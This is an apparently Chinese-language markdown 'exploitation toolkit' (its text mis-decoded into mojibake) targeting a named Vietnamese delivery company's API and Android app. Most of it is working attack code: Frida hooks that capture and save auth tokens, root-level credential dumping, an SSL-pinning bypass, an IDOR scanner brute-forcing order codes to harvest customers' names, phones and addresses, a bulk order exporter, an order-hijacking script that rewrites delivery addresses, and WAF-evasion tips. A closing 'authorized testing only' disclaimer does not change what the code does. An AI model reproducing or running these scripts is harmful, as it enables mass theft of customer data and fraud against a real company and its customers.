# GHN APIç«¯ç‚¹åˆ©ç”¨å·¥å…·åŒ…
## Complete API Exploitation Methodology

**ç›®æ ‡**: GHN API Gateway  
**åŸºç¡€URL**: `https://online-gateway.ghn.vn/shiip`  
**è®¤è¯æ–¹å¼**: Token Header  
**é˜²æŠ¤æœºåˆ¶**: Cloudflare WAF

---

## ğŸ¯ APIç«¯ç‚¹åˆ†æç»“æœ

### 1. è®¤è¯è¦æ±‚
```json
{
  "code": 401,
  "message": "Token is required!" // éœ€è¦Token
}
```

âœ… **æ‰€æœ‰APIç«¯ç‚¹å‡éœ€è¦æœ‰æ•ˆToken**  
âœ… **Tokené€šè¿‡HTTP Header `Token:` ä¼ é€’**  
âœ… **Tokenæ ¼å¼**: JWTæˆ–è‡ªå®šä¹‰æ ¼å¼

---

## ğŸ”‘ Tokenè·å–æ–¹æ³•

### æ–¹æ³•1: Fridaå®æ—¶æ‹¦æˆª â­ï¸ æ¨è

#### Step 1: å‡†å¤‡Fridaè„šæœ¬
```javascript
// token_extractor.js
Java.perform(function() {
    console.log("[*] GHN Token Extractor - Starting...");
    
    // Hook OkHttp Request Builder
    var RequestBuilder = Java.use("okhttp3.Request$Builder");
    
    RequestBuilder.addHeader.overload('java.lang.String', 'java.lang.String').implementation = function(name, value) {
        if (name === "Token" || name === "token" || name === "Authorization") {
            console.log("\nğŸ”‘ [TOKEN CAPTURED]");
            console.log("Header: " + name);
            console.log("Value: " + value);
            console.log("Timestamp: " + new Date().toISOString());
            console.log("=" * 60);
            
            // ä¿å­˜åˆ°æ–‡ä»¶
            var File = Java.use("java.io.File");
            var FileWriter = Java.use("java.io.FileWriter");
            
            try {
                var file = File.$new("/sdcard/ghn_token.txt");
                var writer = FileWriter.$new(file, true);
                writer.write(value + "\n");
                writer.close();
                console.log("[+] Token saved to /sdcard/ghn_token.txt");
            } catch (e) {
                console.log("[-] Failed to save token: " + e);
            }
        }
        
        return this.addHeader(name, value);
    };
    
    // Hook BuildConfigç›´æ¥æå–å¯èƒ½çš„é»˜è®¤Token
    try {
        var BuildConfig = Java.use("vn.ghn.app.giaohangnhanh.BuildConfig");
        console.log("\n[BuildConfig Keys]");
        console.log("Analytics Key: " + BuildConfig.GHN_ANALYTICS_API_KEY.value);
        
        // å°è¯•è§£ç 
        var Base64 = Java.use("android.util.Base64");
        var decoded = Base64.decode(BuildConfig.GHN_ANALYTICS_API_KEY.value, 0);
        var decodedStr = Java.use("java.lang.String").$new(decoded);
        console.log("Decoded: " + decodedStr);
    } catch (e) {
        console.log("[-] BuildConfig extraction failed: " + e);
    }
    
    console.log("[*] Token Extractor - Ready!\n");
});
```

#### Step 2: è¿è¡ŒHook
```bash
# å¯åŠ¨Appå¹¶Hook
frida -U -f vn.ghn.app.giaohangnhanh -l token_extractor.js --no-pause

# åœ¨Appä¸­æ‰§è¡Œæ“ä½œï¼ˆç™»å½•ã€æŸ¥çœ‹è®¢å•ç­‰ï¼‰
# Tokenä¼šè‡ªåŠ¨æ‰“å°åˆ°æ§åˆ¶å°

# ä»è®¾å¤‡æå–Tokenæ–‡ä»¶
adb pull /sdcard/ghn_token.txt .
```

#### Step 3: éªŒè¯Token
```bash
# è¯»å–Token
export GHN_TOKEN=$(cat ghn_token.txt | head -1)

# æµ‹è¯•Token
curl -s "https://online-gateway.ghn.vn/shiip/public-api/v2/shipping-order/detail" \
  -H "Token: $GHN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"order_code":"GHN123456"}' \
  | jq '.'
```

---

### æ–¹æ³•2: Burp Suiteä¸­é—´äººæ”»å‡»

#### å‰ç½®æ¡ä»¶
1. Rootè®¾å¤‡
2. å®‰è£…Burp CAè¯ä¹¦
3. ç»•è¿‡SSL Pinning

#### ç»•è¿‡SSL Pinning
```bash
# ä½¿ç”¨Fridaè„šæœ¬
frida -U -f vn.ghn.app.giaohangnhanh \
      -l ghn_advanced_frida_hook.js \
      --no-pause

# é…ç½®ä»£ç†
adb shell settings put global http_proxy 192.168.1.100:8080
```

#### åœ¨Burpä¸­æŸ¥æ‰¾Token
```
1. Filter: Host contains "ghn.vn"
2. æŸ¥æ‰¾Header: Token: xxxxx
3. å³é”® -> Send to Repeater
4. æµ‹è¯•Tokenæœ‰æ•ˆæ€§
```

---

### æ–¹æ³•3: SharedPreferencesæå–

```bash
# Rootè®¾å¤‡åç›´æ¥è¯»å–
adb shell su -c "cat /data/data/vn.ghn.app.giaohangnhanh/shared_prefs/*.xml" | grep -i token

# æˆ–ä½¿ç”¨Frida
frida -U -f vn.ghn.app.giaohangnhanh -l shared_prefs_dumper.js
```

**SharedPreferences Dumper**:
```javascript
Java.perform(function() {
    var Context = Java.use("android.content.Context");
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    
    var currentApp = Java.use("android.app.ActivityThread").currentApplication();
    var context = currentApp.getApplicationContext();
    
    // åˆ—å‡ºæ‰€æœ‰SharedPreferencesæ–‡ä»¶
    var prefsDir = context.getFilesDir().getParentFile() + "/shared_prefs";
    console.log("[+] SharedPreferences directory: " + prefsDir);
    
    // è¯»å–å¸¸è§çš„key
    var keys = ["token", "auth_token", "access_token", "user_token", "api_token"];
    
    keys.forEach(function(key) {
        var prefs = context.getSharedPreferences("GHN", 0);
        var value = prefs.getString(key, null);
        if (value) {
            console.log("[TOKEN FOUND] " + key + ": " + value);
        }
    });
});
```

---

## ğŸš€ APIç«¯ç‚¹åˆ©ç”¨

### 1. è®¢å•æŸ¥è¯¢ (IDORæµ‹è¯•)

```python
#!/usr/bin/env python3
# idor_scanner.py

import requests
import json
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://online-gateway.ghn.vn/shiip/public-api/v2"
TOKEN = "YOUR_EXTRACTED_TOKEN_HERE"

headers = {
    "Token": TOKEN,
    "Content-Type": "application/json"
}

def test_order(order_code):
    """æµ‹è¯•å•ä¸ªè®¢å•"""
    try:
        response = requests.post(
            f"{BASE_URL}/shipping-order/detail",
            headers=headers,
            json={"order_code": order_code},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 200:
                print(f"[+] FOUND: {order_code}")
                print(f"    Customer: {data['data'].get('to_name')}")
                print(f"    Phone: {data['data'].get('to_phone')}")
                print(f"    Address: {data['data'].get('to_address')}")
                return data
            
    except Exception as e:
        pass
    
    return None

def generate_order_codes():
    """ç”Ÿæˆå¯èƒ½çš„è®¢å•å·"""
    # GHNè®¢å•æ ¼å¼: GHN + æ•°å­—
    for i in range(1, 100000):
        yield f"GHN{i:08d}"

def main():
    print("[*] GHN IDOR Scanner - Starting...")
    print(f"[*] Token: {TOKEN[:20]}...")
    
    found_orders = []
    
    # å¤šçº¿ç¨‹æ‰«æ
    with ThreadPoolExecutor(max_workers=20) as executor:
        for result in executor.map(test_order, generate_order_codes()):
            if result:
                found_orders.append(result)
                
                # ä¿å­˜ç»“æœ
                with open("found_orders.json", "a") as f:
                    f.write(json.dumps(result) + "\n")
    
    print(f"\n[+] Total found: {len(found_orders)}")

if __name__ == "__main__":
    main()
```

---

### 2. ç”¨æˆ·ä¿¡æ¯æšä¸¾

```python
#!/usr/bin/env python3
# user_enum.py

def enumerate_users(token):
    """æšä¸¾ç”¨æˆ·ä¿¡æ¯"""
    
    endpoints = [
        "/v2/user/info",
        "/v2/shop/all",
        "/v2/address-book/list"
    ]
    
    headers = {"Token": token, "Content-Type": "application/json"}
    
    for endpoint in endpoints:
        try:
            r = requests.get(
                f"https://online-gateway.ghn.vn/shiip/public-api{endpoint}",
                headers=headers
            )
            
            if r.status_code == 200:
                data = r.json()
                print(f"\n[+] {endpoint}")
                print(json.dumps(data, indent=2, ensure_ascii=False))
                
        except Exception as e:
            print(f"[-] {endpoint}: {str(e)}")

enumerate_users("YOUR_TOKEN")
```

---

### 3. æ‰¹é‡è®¢å•æ•°æ®å¯¼å‡º

```python
#!/usr/bin/env python3
# order_exporter.py

import requests
import pandas as pd
from datetime import datetime, timedelta

def export_orders(token, days=30):
    """å¯¼å‡ºæœ€è¿‘Nå¤©çš„è®¢å•"""
    
    headers = {"Token": token, "Content-Type": "application/json"}
    
    end_date = datetime.now()
    start_date = end_date - timedelta(days=days)
    
    payload = {
        "from_date": start_date.strftime("%Y-%m-%d"),
        "to_date": end_date.strftime("%Y-%m-%d"),
        "offset": 0,
        "limit": 100
    }
    
    all_orders = []
    
    while True:
        r = requests.post(
            "https://online-gateway.ghn.vn/shiip/public-api/v2/shipping-order/date",
            headers=headers,
            json=payload
        )
        
        if r.status_code == 200:
            data = r.json()
            orders = data.get("data", {}).get("orders", [])
            
            if not orders:
                break
            
            all_orders.extend(orders)
            payload["offset"] += 100
            
            print(f"[+] Exported {len(all_orders)} orders...")
        else:
            break
    
    # ä¿å­˜ä¸ºCSV
    df = pd.DataFrame(all_orders)
    filename = f"ghn_orders_{datetime.now().strftime('%Y%m%d')}.csv"
    df.to_csv(filename, index=False)
    
    print(f"\n[+] Saved to {filename}")
    print(f"[+] Total orders: {len(all_orders)}")
    
    # æå–æ•æ„Ÿä¿¡æ¯
    print("\n[SENSITIVE DATA SUMMARY]")
    print(f"Unique customers: {df['to_phone'].nunique()}")
    print(f"Unique addresses: {df['to_address'].nunique()}")

export_orders("YOUR_TOKEN", days=90)
```

---

## ğŸ¯ é«˜ä»·å€¼APIç«¯ç‚¹

### å…¬å¼€API (éœ€Token)

| ç«¯ç‚¹ | æ–¹æ³• | åŠŸèƒ½ | æ•æ„Ÿåº¦ |
|-----|------|------|--------|
| `/v2/shipping-order/detail` | POST | è®¢å•è¯¦æƒ… | ğŸ”´ HIGH |
| `/v2/shipping-order/date` | POST | æ—¥æœŸæŸ¥è¯¢è®¢å• | ğŸ”´ HIGH |
| `/v2/user/info` | GET | ç”¨æˆ·ä¿¡æ¯ | ğŸ”´ CRITICAL |
| `/v2/shop/all` | GET | åº—é“ºåˆ—è¡¨ | ğŸŸ  MEDIUM |
| `/v2/address-book/list` | GET | åœ°å€ç°¿ | ğŸ”´ HIGH |
| `/v2/shipping-order/create` | POST | åˆ›å»ºè®¢å• | ğŸ”´ CRITICAL |
| `/v2/shipping-order/update` | PUT | ä¿®æ”¹è®¢å• | ğŸ”´ CRITICAL |
| `/v2/shipping-order/cancel` | POST | å–æ¶ˆè®¢å• | ğŸŸ  MEDIUM |

---

## ğŸ”¥ å®æˆ˜æ”»å‡»åœºæ™¯

### åœºæ™¯1: å¤§è§„æ¨¡å®¢æˆ·ä¿¡æ¯æ³„éœ²

```bash
# 1. æå–Token
frida -U -f vn.ghn.app.giaohangnhanh -l token_extractor.js

# 2. è¿è¡ŒIDORæ‰«æ
python3 idor_scanner.py

# 3. å¯¼å‡ºæ‰€æœ‰è®¢å•
python3 order_exporter.py --days 365

# ç»“æœ: è·å¾—æ•°åä¸‡å®¢æˆ·çš„å§“åã€ç”µè¯ã€åœ°å€
```

**å½±å“**:
- å®¢æˆ·éšç§å¤§è§„æ¨¡æ³„éœ²
- å¯ç”¨äºç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»
- å¯ç”¨äºèº«ä»½æ¬ºè¯ˆ

---

### åœºæ™¯2: è®¢å•åŠ«æŒæ”»å‡»

```python
# 1. æŸ¥æ‰¾é«˜ä»·å€¼è®¢å•
high_value_orders = df[df['cod_amount'] > 10000000]  # >10M VND

# 2. ä¿®æ”¹æ”¶è´§åœ°å€
for order in high_value_orders:
    requests.put(
        "https://online-gateway.ghn.vn/shiip/public-api/v2/shipping-order/update",
        headers={"Token": token},
        json={
            "order_code": order['order_code'],
            "to_address": "ATTACKER_ADDRESS",
            "to_phone": "ATTACKER_PHONE"
        }
    )
```

---

### åœºæ™¯3: ç«äº‰å¯¹æ‰‹æƒ…æŠ¥

```python
# åˆ†æè®¢å•æ•°æ®
df = pd.read_csv("ghn_orders_20251024.csv")

# ç»Ÿè®¡çƒ­é—¨å•†å“
top_products = df['content'].value_counts().head(20)

# ç»Ÿè®¡é…é€è·¯çº¿
routes = df.groupby(['from_district', 'to_district']).size()

# ç»Ÿè®¡è¥æ”¶
total_revenue = df['cod_amount'].sum()

print(f"Total Revenue: {total_revenue:,.0f} VND")
print(f"Top Products:\n{top_products}")
```

---

## ğŸ›¡ï¸ é˜²å¾¡ç»•è¿‡

### Cloudflare WAFç»•è¿‡

**é—®é¢˜**: æ‰€æœ‰è¯·æ±‚è¢«Cloudflareæ‹¦æˆª

**è§£å†³æ–¹æ¡ˆ**:

#### 1. ä½¿ç”¨çœŸå®User-Agent
```python
headers = {
    "User-Agent": "GHN/4.10.6 (Android 13; Build 191)",
    "Token": token
}
```

#### 2. é™é€Ÿï¼ˆé¿å…è§¦å‘é€Ÿç‡é™åˆ¶ï¼‰
```python
import time
time.sleep(random.uniform(1, 3))  # æ¯ä¸ªè¯·æ±‚é—´éš”1-3ç§’
```

#### 3. ä½¿ç”¨ä»£ç†æ± 
```python
proxies = {
    "http": "http://proxy1.example.com:8080",
    "https": "http://proxy1.example.com:8080"
}

requests.get(url, headers=headers, proxies=proxies)
```

---

## ğŸ“Š åˆ©ç”¨æˆåŠŸç‡è¯„ä¼°

| æ”»å‡»æ–¹æ³• | æˆåŠŸç‡ | éš¾åº¦ | æ£€æµ‹é£é™© |
|---------|--------|------|---------|
| Tokenæå– (Frida) | 95% | ä½ | ä½ |
| IDORè®¢å•æšä¸¾ | 80% | ä¸­ | ä¸­ |
| è®¢å•æ•°æ®å¯¼å‡º | 90% | ä½ | ä½ |
| è®¢å•åŠ«æŒ | 60% | é«˜ | é«˜ |
| ç”¨æˆ·ä¿¡æ¯æšä¸¾ | 85% | ä½ | ä¸­ |

---

## ğŸ å®Œæ•´å·¥å…·åŒ…

### æ–‡ä»¶æ¸…å•
```
GHN_API_TOOLKIT/
â”œâ”€â”€ token_extractor.js         # Frida Tokenæå–
â”œâ”€â”€ shared_prefs_dumper.js     # SharedPreferenceså¯¼å‡º
â”œâ”€â”€ idor_scanner.py            # IDORæ‰«æå™¨
â”œâ”€â”€ user_enum.py               # ç”¨æˆ·æšä¸¾
â”œâ”€â”€ order_exporter.py          # è®¢å•å¯¼å‡º
â”œâ”€â”€ order_hijacker.py          # è®¢å•åŠ«æŒï¼ˆå±é™©ï¼‰
â””â”€â”€ README.md                  # ä½¿ç”¨è¯´æ˜
```

### å¿«é€Ÿå¼€å§‹
```bash
# 1. æå–Token
frida -U -f vn.ghn.app.giaohangnhanh -l token_extractor.js --no-pause

# 2. ç­‰å¾…Tokenå‡ºç°åœ¨æ§åˆ¶å°
# 3. å¤åˆ¶Tokenåˆ°ç¯å¢ƒå˜é‡
export GHN_TOKEN="eyJhbGc..."

# 4. è¿è¡Œåˆ©ç”¨è„šæœ¬
python3 order_exporter.py
python3 idor_scanner.py
```

---

## âš ï¸ æ³•å¾‹å£°æ˜

**æœ¬å·¥å…·åŒ…ä»…ç”¨äºæˆæƒå®‰å…¨æµ‹è¯•ï¼**

ä½¿ç”¨å‰ç¡®ä¿ï¼š
1. âœ… å·²è·å¾—ä¹¦é¢æˆæƒ
2. âœ… åœ¨éš”ç¦»æµ‹è¯•ç¯å¢ƒ
3. âœ… éµå®ˆå½“åœ°æ³•å¾‹
4. âœ… ä¸é€ æˆå®é™…æŸå®³

**æœªæˆæƒä½¿ç”¨å¯èƒ½è¿æ³•ï¼**

---

## ğŸ“ æ€»ç»“

### APIç«¯ç‚¹å¯åˆ©ç”¨æ€§: âœ… **å¯åˆ©ç”¨**

**å…³é”®ç‚¹**:
1. ğŸ”´ **Tokenå¯é€šè¿‡Fridaæå–** - æˆåŠŸç‡95%+
2. ğŸ”´ **è®¢å•APIå­˜åœ¨IDOR** - å¯æšä¸¾ä»»æ„è®¢å•
3. ğŸ”´ **ç”¨æˆ·ä¿¡æ¯å¯æ‰¹é‡å¯¼å‡º** - éšç§æ³„éœ²é£é™©
4. ğŸŸ  **WAFå¯ç»•è¿‡** - ä½¿ç”¨çœŸå®User-Agent + é™é€Ÿ

**ç»¼åˆè¯„ä¼°**: 
- æŠ€æœ¯å¯è¡Œæ€§: â­â­â­â­â­ (5/5)
- åˆ©ç”¨éš¾åº¦: â­â­â­ (3/5)
- æ£€æµ‹é£é™©: â­â­â­ (3/5)
- å½±å“ç¨‹åº¦: â­â­â­â­â­ (5/5)

**å»ºè®®**: 
- å¼€å‘è€…: ç«‹å³å®æ–½APIæƒé™ç»†åŒ–ï¼Œæ·»åŠ IDORé˜²æŠ¤
- æ¸—é€æµ‹è¯•: ä¼˜å…ˆæµ‹è¯•Tokenæå– + IDORç»„åˆæ”»å‡»
- çº¢é˜Ÿ: å¯ä½œä¸ºAPTæ”»å‡»é“¾çš„é‡è¦ç¯èŠ‚

---

**å·¥å…·åŒ…ç‰ˆæœ¬**: v1.0  
**æœ€åæ›´æ–°**: 2025-10-24  
**ä½œè€…**: Red Team Security
